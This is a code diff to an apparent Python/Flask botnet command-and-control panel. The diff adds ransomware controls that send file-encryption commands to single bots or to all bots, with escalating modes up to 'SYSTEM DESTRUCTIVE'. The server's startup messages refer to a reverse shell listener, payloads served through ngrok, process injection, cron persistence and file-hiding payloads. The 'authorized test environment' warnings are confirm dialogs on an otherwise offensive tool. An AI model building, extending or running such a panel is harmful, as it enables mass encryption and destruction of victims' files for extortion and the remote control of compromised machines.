@@ -302,7 +302,13 @@ def admin_panel():
                                 <option value="trigger_fileransom encrypt /home/user/Desktop">Encrypt Desktop</option>
                                 <option value="trigger_fileransom encrypt /home/user/Pictures">Encrypt Pictures</option>
                                 <option value="trigger_fileransom encrypt /tmp">Encrypt /tmp (Test)</option>
+                                <option value="trigger_fileransom encrypt all">Encrypt All User Files</option>
+                                <option value="trigger_fileransom encrypt system_test">System Test (/tmp only)</option>
+                                <option value="trigger_fileransom encrypt system_user">System User Mode</option>
+                                <option value="trigger_fileransom encrypt system_aggressive">System Aggressive</option>
+                                <option value="trigger_fileransom encrypt system_destructive">SYSTEM DESTRUCTIVE</option>
                                 <option value="trigger_fileransom decrypt /home/user/Documents">Decrypt Documents</option>
+                                <option value="trigger_fileransom decrypt system_wide">System Wide Decrypt</option>
                                 <!-- END FILE ENCRYPTION -->
                                 <option value="trigger_status">Implant Status</option>
                                 <option value="trigger_help">Show Help</option>
@@ -355,7 +361,7 @@ def admin_panel():
                     
                     <!-- FILE ENCRYPTION TOOL -->
                     <div class="section warning-box">
-                        <h3 style="color: #ff6600;"> File Encryption Tool (DESTRUCTIVE)</h3>
+                        <h3 style="color: #ff6600;">⚠️ File Encryption Tool (DESTRUCTIVE)</h3>
                         <p><small>WARNING: This tool encrypts files and removes originals. Only use in authorized test environments!</small></p>
                         
                         <div class="fileransom-form">
@@ -368,7 +374,18 @@ def admin_panel():
                             </div>
                             <div>
                                 <label>Target Path:</label>
-                                <input type="text" id="fileransom_path" placeholder="/home/user/Documents" style="width: 300px;">
+                                <input type="text" id="fileransom_path" placeholder="/home/user/Documents or 'all' or 'system_<mode>'" style="width: 300px;">
+                            </div>
+                            <div>
+                                <label>Mode (for encryption):</label>
+                                <select id="fileransom_mode">
+                                    <option value="standard">Standard (specified path)</option>
+                                    <option value="all">All User Files</option>
+                                    <option value="system_test">System Test (/tmp only)</option>
+                                    <option value="system_user">System User (user dirs only)</option>
+                                    <option value="system_aggressive">System Aggressive (+logs)</option>
+                                    <option value="system_destructive">SYSTEM DESTRUCTIVE</option>
+                                </select>
                             </div>
                             <div>
                                 <label>Password (optional for encrypt):</label>
@@ -379,10 +396,10 @@ def admin_panel():
                             </div>
                         </div>
                         <div style="margin-top: 10px;">
-                            <button onclick="quickFileransom('encrypt', '/home/user/Documents')" style="background: #ff3300;">Quick: Encrypt Documents</button>
-                            <button onclick="quickFileransom('encrypt', '/home/user/Downloads')" style="background: #ff3300;">Quick: Encrypt Downloads</button>
-                            <button onclick="quickFileransom('encrypt', '/home/user/Desktop')" style="background: #ff3300;">Quick: Encrypt Desktop</button>
-                            <button onclick="quickFileransom('decrypt', '/home/user/Documents')" style="background: #3366ff;">Quick: Decrypt Documents</button>
+                            <button onclick="quickFileransom('encrypt', 'all', null)" style="background: #ff5500;">Quick: Encrypt All User Files</button>
+                            <button onclick="quickFileransom('encrypt', 'system_test', null)" style="background: #ff9900;">System Test (/tmp only)</button>
+                            <button onclick="quickFileransom('encrypt', 'system_user', null)" style="background: #ff3300;">System User Mode</button>
+                            <button onclick="quickFileransom('decrypt', 'system_wide', null)" style="background: #3366ff;">System Wide Decrypt</button>
                         </div>
                     </div>
                 </div>
@@ -441,7 +458,13 @@ def admin_panel():
                         <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Downloads')">Encrypt Downloads</button>
                         <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Desktop')">Encrypt Desktop</button>
                         <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /tmp')" style="background: #ff3300;">Test Encrypt /tmp</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt all')" style="background: #ff5500;">Encrypt All User Files</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_test')" style="background: #ff9900;">System Test (/tmp only)</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_user')" style="background: #ff3300;">System User Mode</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_aggressive')" style="background: #ff2200;">System Aggressive</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_destructive')" style="background: #ff0000; color: white;">SYSTEM DESTRUCTIVE</button>
                         <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt /home/user/Documents')" style="background: #3366ff;">Decrypt Documents</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt system_wide')" style="background: #0066ff;">System Wide Decrypt</button>
                     </div>
                 </div>
                 
@@ -607,7 +630,7 @@ def admin_panel():
                         <!-- END NEW PAYLOADS -->
                         <div class="bot" style="border: 2px solid #ff6600;">
                             <strong style="color: #ff6600;">File Encryption</strong>
-                            <p><small> AES-256 file encryption/decryption</small></p>
+                            <p><small> AES-256 file encryption/decryption with system-wide modes</small></p>
                             <button onclick="sendToAll('load_payload fileransom.py')">Load</button>
                             <button onclick="sendToAll('run_payload fileransom.py')" style="background: #ff6600;">Run</button>
                         </div>
@@ -759,6 +782,8 @@ def admin_panel():
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_procinject'" style="background: #8a2be2;">Insert Process Inject</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt all'" style="background: #ff5500;">Insert Encrypt All</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt system_destructive'" style="background: #ff0000; color: white;">Insert System Destructive</button>
             </div>
         </div>
         
@@ -819,8 +844,18 @@ def admin_panel():
                 
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
-                        return;
+                    if (command.includes('system_destructive')) {
+                        if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                            return;
+                        }
+                    } else if (command.includes('system_aggressive')) {
+                        if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else {
+                        if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                            return;
+                        }
                     }
                 }
                 
@@ -843,8 +878,18 @@ def admin_panel():
             function sendToBot(botId, command) {
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
-                        return;
+                    if (command.includes('system_destructive')) {
+                        if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                            return;
+                        }
+                    } else if (command.includes('system_aggressive')) {
+                        if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else {
+                        if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                            return;
+                        }
                     }
                 }
                 
@@ -883,8 +928,18 @@ def admin_panel():
             function sendToAll(command) {
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
-                        return;
+                    if (command.includes('system_destructive')) {
+                        if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS COMMAND WILL BE SENT TO ALL BOTS AND MAY BREAK ENTIRE SYSTEMS!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                            return;
+                        }
+                    } else if (command.includes('system_aggressive')) {
+                        if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation on ALL bots.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else {
+                        if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
+                            return;
+                        }
                     }
                 }
                 
@@ -915,8 +970,18 @@ def admin_panel():
                 
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
-                        return;
+                    if (command.includes('system_destructive')) {
+                        if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                            return;
+                        }
+                    } else if (command.includes('system_aggressive')) {
+                        if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else {
+                        if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                            return;
+                        }
                     }
                 }
                 
@@ -950,48 +1015,80 @@ def admin_panel():
             function sendFileransomCommand() {
                 var action = document.getElementById('fileransom_action').value;
                 var path = document.getElementById('fileransom_path').value;
+                var mode = document.getElementById('fileransom_mode').value;
                 var password = document.getElementById('fileransom_password').value;
                 
-                if (!path) {
-                    if (action === 'encrypt') {
-                        path = '/home/user/Documents';
-                    } else {
-                        alert('Please enter a target path for decryption');
+                // Build command based on mode
+                var cmd = 'trigger_fileransom ' + action;
+                
+                if (mode === 'standard' && path) {
+                    cmd += ' ' + path;
+                } else if (mode === 'all') {
+                    cmd += ' all';
+                } else if (mode.startsWith('system_')) {
+                    cmd += ' ' + mode;
+                }
+                
+                if (password) {
+                    cmd += ' ' + password;
+                } else if (action === 'decrypt' && !password) {
+                    cmd += ' --password REQUIRED'; // Will need password from other source
+                }
+                
+                // Special warnings
+                if (mode === 'system_destructive') {
+                    if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                        return;
+                    }
+                } else if (mode === 'system_aggressive') {
+                    if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                        return;
+                    }
+                } else if (action === 'encrypt' && (mode !== 'system_test' && mode !== 'standard')) {
+                    if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
                 
-                // Special warning for encryption
-                if (action === 'encrypt') {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
-                        return;
-                    }
+                // Find the currently selected bot
+                var selectedBot = document.querySelector('.bot.active-bot');
+                if (!selectedBot) {
+                    alert('Please select a bot first');
+                    return;
                 }
                 
-                var cmd = 'trigger_fileransom ' + action + ' ' + path;
+                var botId = selectedBot.querySelector('strong').textContent.trim();
+                sendToBot(botId, cmd);
+            }
+            
+            function quickFileransom(action, target, password) {
+                var cmd = 'trigger_fileransom ' + action + ' ' + target;
                 if (password) {
                     cmd += ' ' + password;
                 }
                 
-                var botId = selectedBotId();
-                if (!botId) return;
-                
-                sendToBot(botId, cmd);
-            }
-            
-            function quickFileransom(action, path) {
-                // Special warning for encryption
-                if (action === 'encrypt') {
-                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                // Special warnings
+                if (target === 'system_destructive') {
+                    if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nType OK to confirm you are in an isolated test environment:')) {
+                        return;
+                    }
+                } else if (target === 'system_aggressive') {
+                    if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                        return;
+                    }
+                } else if (action === 'encrypt') {
+                    if (!confirm('⚠️ File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
                 
-                var cmd = 'trigger_fileransom ' + action + ' ' + path;
+                var selectedBot = document.querySelector('.bot.active-bot');
+                if (!selectedBot) {
+                    alert('Please select a bot first');
+                    return;
+                }
                 
-                var botId = selectedBotId();
-                if (!botId) return;
-                
+                var botId = selectedBot.querySelector('strong').textContent.trim();
                 sendToBot(botId, cmd);
             }
             
@@ -1229,8 +1326,18 @@ def list_payloads():
         <script>
             function sendToAll(command) {
                 if (command.includes('fileransom')) {
-                    if (!confirm(' WARNING: File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
-                        return;
+                    if (command.includes('system_destructive')) {
+                        if (!confirm('⚠️ DESTRUCTIVE SYSTEM WIDE ENCRYPTION\\n\\nTHIS CAN BREAK THE ENTIRE SYSTEM!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else if (command.includes('system_aggressive')) {
+                        if (!confirm('⚠️ Aggressive System Encryption\\n\\nThis will encrypt system logs which may affect system operation.\\n\\nContinue?')) {
+                            return;
+                        }
+                    } else {
+                        if (!confirm('⚠️ File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
+                            return;
+                        }
                     }
                 }
                 fetch('/command', {
@@ -1422,6 +1529,7 @@ def main():
     print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
     print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
     print(f"[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner")
+    print(f"[FILE ENCRYPTION] System-wide modes: system_test, system_user, system_aggressive, system_destructive")
     print("\n" + "="*60)
     
     # Start Flask server
